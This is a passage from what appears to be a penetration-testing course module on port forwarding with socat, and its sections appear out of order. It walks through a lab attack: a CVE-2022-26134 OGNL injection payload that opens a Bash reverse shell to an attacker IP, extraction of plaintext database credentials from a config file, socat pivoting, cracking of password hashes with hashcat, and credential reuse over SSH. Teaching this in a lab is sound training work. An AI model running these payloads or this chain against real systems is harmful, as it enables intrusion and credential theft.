One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

